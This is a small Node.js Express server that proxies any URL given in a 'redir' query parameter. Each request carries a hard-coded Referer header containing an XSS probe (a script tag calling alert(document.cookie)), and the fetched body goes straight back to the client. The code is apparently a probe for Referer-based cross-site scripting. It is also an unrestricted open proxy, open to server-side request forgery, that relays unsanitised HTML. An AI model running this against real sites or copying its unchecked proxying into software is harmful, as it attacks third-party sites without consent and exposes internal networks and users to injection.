const express = require('express');
const request = require('request');
const app = express();

app.get('/', (req, res) => {
    const targetUrl = req.query.redir;

    if (!targetUrl) {
        return res.status(400).send("Error: No URL specified in the 'redir' parameter.");
    }

    try {
        // Validate the target URL
        const validatedUrl = new URL(targetUrl);

        // Use the "request" library to proxy the request with a custom Referer header
        request(
            {
                url: validatedUrl.href,
                headers: {
                    Referer: "https://www.google.com/search?hl=en&q=testing'\"()&%<zzz><ScRiPt>alert(document.cookie)</ScRiPt>"
                }
            },
            (error, response, body) => {
                if (error) {
                    return res.status(500).send("Error: Unable to complete request.");
                }
                // Forward the response from the target server to the client
                res.status(response.statusCode).send(body);
            }
        );
    } catch (error) {
        return res.status(400).send("Error: Invalid URL.");
    }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

